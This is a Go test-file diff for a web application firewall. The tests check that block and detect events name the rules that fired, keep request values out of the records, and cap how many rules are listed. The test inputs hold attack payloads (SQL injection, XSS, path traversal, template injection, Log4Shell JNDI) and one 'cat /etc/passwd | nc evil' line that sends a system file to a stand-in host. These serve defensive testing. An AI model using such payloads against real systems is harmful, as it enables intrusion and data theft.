@@ -291,3 +291,116 @@ func TestBlockModeRecordsBlockNotDetect(t *testing.T) {
 		t.Fatalf("expected one block event, got %+v", got)
 	}
 }
+
+func ruleIDs(rs []events.Rule) []int {
+	var ids []int
+	for _, r := range rs {
+		ids = append(ids, r.ID)
+	}
+	return ids
+}
+
+// Events must say why, not just "score exceeded": the contributing CRS rules,
+// their attack class and the variable that matched, but never the value.
+func TestBlockEventNamesTheRulesThatFired(t *testing.T) {
+	w, drain := newCapturingWAF(t, config.WAFConfig{Enabled: true, Mode: "block"})
+	h := w.Middleware(okHandler())
+	cases := []struct {
+		name, query, wantTag string
+		wantRule             int
+	}{
+		{"sqli", `' OR '1'='1`, "attack-sqli", 942100},
+		{"xss", `<script>alert(1)</script>`, "attack-xss", 941100},
+		{"path traversal", `../../../etc/passwd`, "attack-lfi", 930120},
+	}
+	for _, c := range cases {
+		target := "/rest/products/search?q=" + url.QueryEscape(c.query)
+		if rec := doRequest(t, h, http.MethodGet, target); rec.Code != http.StatusForbidden {
+			t.Fatalf("%s: expected 403, got %d", c.name, rec.Code)
+		}
+		got := drain()
+		if len(got) != 1 {
+			t.Fatalf("%s: expected one event, got %+v", c.name, got)
+		}
+		e := got[0]
+		if e.Score < 5 {
+			t.Errorf("%s: score %d, want >= the blocking threshold", c.name, e.Score)
+		}
+		found := false
+		for _, r := range e.Rules {
+			if r.ID == c.wantRule {
+				found = true
+				if r.Msg == "" || r.Severity < 0 || r.PL != 1 {
+					t.Errorf("%s: rule %d lacks detail: %+v", c.name, r.ID, r)
+				}
+				hasTag := false
+				for _, tag := range r.Tags {
+					hasTag = hasTag || tag == c.wantTag
+				}
+				if !hasTag {
+					t.Errorf("%s: rule %d tags %v, want %s", c.name, r.ID, r.Tags, c.wantTag)
+				}
+			}
+			if r.ID == 949110 || r.ID == 959100 {
+				t.Errorf("%s: evaluation rule %d must not be listed", c.name, r.ID)
+			}
+			if strings.Contains(r.Var, c.query) || strings.Contains(r.Msg, c.query) {
+				t.Errorf("%s: rule leaks the request value: %+v", c.name, r)
+			}
+		}
+		if !found {
+			t.Errorf("%s: rule %d not among %v", c.name, c.wantRule, ruleIDs(e.Rules))
+		}
+		if len(e.Rules) > maxEventRules {
+			t.Errorf("%s: %d rules exceeds cap %d", c.name, len(e.Rules), maxEventRules)
+		}
+	}
+}
+
+func TestDetectEventNamesTheRulesToo(t *testing.T) {
+	w, drain := newCapturingWAF(t, config.WAFConfig{Enabled: true, Mode: "detect"})
+	doRequest(t, w.Middleware(okHandler()), http.MethodGet, "/rest/products/search?q="+url.QueryEscape(`' OR '1'='1`))
+	got := drain()
+	if len(got) != 1 || got[0].Action != events.ActionDetect || len(got[0].Rules) == 0 || got[0].Score < 5 {
+		t.Fatalf("detect event should carry score and rules: %+v", got)
+	}
+	if got[0].Rules[0].Var != "ARGS:q" {
+		t.Errorf("matched variable = %q, want ARGS:q", got[0].Rules[0].Var)
+	}
+}
+
+// A custom rule appears with its own ID, so an operator can tell their rule
+// from CRS's.
+func TestCustomRuleAppearsWithItsID(t *testing.T) {
+	w, drain := newCapturingWAF(t, config.WAFConfig{
+		Enabled: true, Mode: "block", ParanoiaLevel: 1, CustomRulesDir: "../../configs/waf-custom-rules",
+	})
+	doRequest(t, w.Middleware(okHandler()), http.MethodGet, "/rest/products/search?q="+url.QueryEscape("{{7*7}}"))
+	got := drain()
+	if len(got) != 1 {
+		t.Fatalf("expected one event, got %+v", got)
+	}
+	var custom bool
+	for _, r := range got[0].Rules {
+		custom = custom || (r.ID >= customRuleIDMin && r.Msg != "")
+	}
+	if !custom {
+		t.Fatalf("expected a custom-range rule among %+v", got[0].Rules)
+	}
+}
+
+// A payload mixing many attack types trips far more rules than an event
+// should carry: the list is capped and the remainder counted.
+func TestEventRulesAreCappedAndRemainderCounted(t *testing.T) {
+	w, drain := newCapturingWAF(t, config.WAFConfig{Enabled: true, Mode: "block"})
+	payload := `1' UNION SELECT username,password FROM users WHERE 1=1; DROP TABLE x-- <script>alert(1)</script> ../../etc/passwd ; cat /etc/passwd | nc evil 1 ${jndi:ldap://x/a}`
+	doRequest(t, w.Middleware(okHandler()), http.MethodGet, "/search?q="+url.QueryEscape(payload))
+	got := drain()
+	if len(got) != 1 {
+		t.Fatalf("expected one event, got %d", len(got))
+	}
+	if len(got[0].Rules) != maxEventRules || got[0].RulesOmitted == 0 {
+		t.Fatalf("expected %d rules and some omitted, got %d rules, %d omitted",
+			maxEventRules, len(got[0].Rules), got[0].RulesOmitted)
+	}
+}
